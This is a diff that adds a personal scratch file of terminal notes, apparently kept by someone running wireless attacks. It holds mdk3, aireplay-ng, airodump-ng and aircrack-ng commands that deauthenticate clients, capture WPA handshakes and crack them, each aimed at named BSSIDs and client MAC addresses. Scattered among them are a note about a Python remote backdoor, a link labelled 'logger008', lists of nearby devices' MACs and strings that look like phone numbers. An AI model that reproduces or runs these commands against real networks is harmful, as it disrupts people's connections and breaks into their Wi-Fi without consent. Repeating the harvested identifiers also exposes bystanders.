@@ -1,0 +1,84 @@
+apt-get autoremove
+Select another interface with internet access:
+simple remote backdoor with python
+
+bit.ly/logger008
+nmap -v -O
+
+c4:54:44:8d:a6:da
+
+apt-get install youtube-dl
+https://www.youtube.com/watch?v=MG-plwLwd5Q
+apt-get install vlc 
+shutdown -h now
+10.3.108.3
+/etc/init.d/network-manager start
+
+==============
+ubuntu
+
+https://askubuntu.com/questions/140246/how-do-i-resolve-unmet-dependencies-after-adding-a-ppa
+==============================
+http://www.h.com/status
+
+
+https://mega.nz/#F!OI9jRKaB!wdT6B-e5MhDv4DBqnEaU4A
+https://www.gnu.org/proprietary/proprietary.html
+
+=====================================================
+
+https://www.traidsoft.net/2017/06/Download-Yemen-Phone-Apk.html
+==================================
+ 10:FE:ED:7D:33:FF  -89      117       11    0   3  270   OPN              wfaye 39.39.39.39.                              
+
+ B0:4E:26:B9:55:6C  A4:07:B6:03:03:D1  
+ B0:4E:26:B9:55:6C  D0:F8:8C:7B:C8:7F  fc:db:b3:67:93:9b 88:30:8A:DF:E5:97
+ EC:08:6B:A8:70:59   @@@ 50:9E:A7:C0:9D:63 
+ 68:72:51:22:17:4A  F0:27:65:83:85:8D 
+20:F4:78:AB:C3:A9
+=====================================================
+ 10:FE:ED:7D:33:FF   -1        0        0    0  11   -1                    <length:  0>                                    
+00:9D:6B:0B:37:1D
+
+
+88:30:8A:DF:E5:97
+
+
+
+https://www.gnu.org/proprietary/proprietary.html
+D0:F8:8C:7B:C8:7F
+
+D0:25:98:33:ED:91
+
+
+
+mdk3 wlan1 d -b /root/mac-list.txt -c 1
+
+
+Mila1
+
+
+
+
+===========================================
+airodump-ng -c 10 --bssid C4:6E:1F:58:81:B6 -w /root/handshakes/ wlan1mon
+
+aireplay-ng –0 2 –a C4:6E:1F:58:81:B6 –c 3E:D1:D9:3A:70:F2 wlan1mon
+
+aircrack-ng –a2 –b 00:14:BF:E0:E8:D5 –w /root/wpa.txt  /root/Desktop/*.cap
+
+
+==============================
+aireplay-ng -0 20 -a 64:70:02:46:F6:2E wlan1 
+
+airodump-ng -c 11 --bssid 64:70:02:46:F6:2E -w 2020 wlan1  EBRALI
+
+
+====================================
+antenna 1 BA RA:8c:83:e1:9c:21:96 
+=================================
+772240821
+776331124
+771032774
+775859677
+
